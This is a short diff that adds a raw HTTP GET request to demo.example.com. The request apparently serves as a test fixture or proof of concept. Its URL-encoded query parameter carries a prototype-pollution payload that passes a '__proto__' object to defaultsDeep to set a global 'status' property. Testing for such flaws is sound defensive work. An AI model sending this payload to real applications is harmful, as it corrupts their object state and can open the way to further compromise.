@@ -1,0 +1,4 @@
+GET /a?input=defaultsDeep%28%7B%7D%2C%7B%22__proto__%22%3A%7B%22status%22%3A5%7D%7D%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
